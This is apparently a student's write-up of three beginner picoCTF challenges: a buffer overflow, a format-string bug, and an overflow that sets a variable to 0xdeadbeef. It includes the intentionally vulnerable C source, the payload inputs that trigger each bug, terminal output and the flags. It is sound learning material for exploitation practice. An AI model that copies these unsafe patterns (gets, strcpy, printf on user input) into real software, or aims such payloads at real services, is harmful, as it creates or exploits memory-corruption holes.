# 1. Binary overflow 0:

Let's start off simple, can you overflow the correct buffer?  
Connect using: nc saturn.picoctf.net 57136
```
C code given:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
## Solution:

From the name of the challenge, we can identify that we have to do buffer overflow. In the source code of the program, which was in C, one of the array had a size of 16, so we had to enter a input which had greater
than 16 characters, which will cause an overflow, and give us the flag. 

```
saltycoder@LAPTOP-LP81GQQE:~$ nc saturn.picoctf.net 57136
Input: 12
The program will exit now
^C
saltycoder@LAPTOP-LP81GQQE:~$ nc saturn.picoctf.net 57136
Input: ssssssssssssssssssssssss
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:

- I learnt about buffer overflow, which is when we overflow the stack by overflowing one of the variable and exploit the program to our advantage. 

## Notes:

I first tried running the commands directly on vs code terminal, but realised it is a Linux command, so we have to run it on a Linix command line. 

## Resources:

https://ctf101.org/binary-exploitation/buffer-overflow/

https://youtube.com/watch?v=CRTR5ljBjPM

***

# 2. Format string 0: 

Can you use your knowledge of format strings to make the customers happy? Connect with the challenge instance here:
```
nc mimas.picoctf.net 56375
```
C code that was given: 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

## Solution:

This challenge, from its name was mainly about format specifiers in C like "%s", "%d", etc. They aksed us to enter recommendationn from a list and we have to select the one which had C format specifiers since the source code is in C. It was straightforward and after we enter two recommendations correctly, we will get the flag.

```
Terminal output:

Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Concepts learnt:

- I learnt about format specifiers in C, which is used to tell the compiler about the type of data to be printed or scanned in input and output operations. It can be exploited if the code dosen't have proper format specifiers. 



## Resources:

https://www.geeksforgeeks.org/c/format-specifiers-in-c/

***

# 3. Clutter overflow: 

Clutter, clutter everywhere and not a byte to use.
```
C code:

#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100 
#define GOAL 0xdeadbeef 

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```

## Solution:

After some trial and error, when we kept things after 264, it was giving the ASCII values of the characters entered in reverse order to the variable code. Since in order to get the flag, we have to get the hexadecimal value of deadbeef to code, we have to keep the hexadecimal value of the reverse of deadbeef after all the junk to overflow it, and then we will get the flag. 


```
My room is so cluttered...
What do you see?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde
```

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

I learnt about padding, which is basically some extra memory the computer keeps to align the data correctly. It is used by compilers by compilers to optimize memory access and ensure proper data alignment within structures.

## Notes:

This challenge took a lot of trial and error to find out how much randoms we had to keep before it overflowed. The size of array was 256, and when I kept 256 randoms and tried to overflow it, it didnt work. It worked after i kept 264 randoms because of padding. 

## Resources:

https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN

https://youtube.com/watch?v=CRTR5ljBjPM

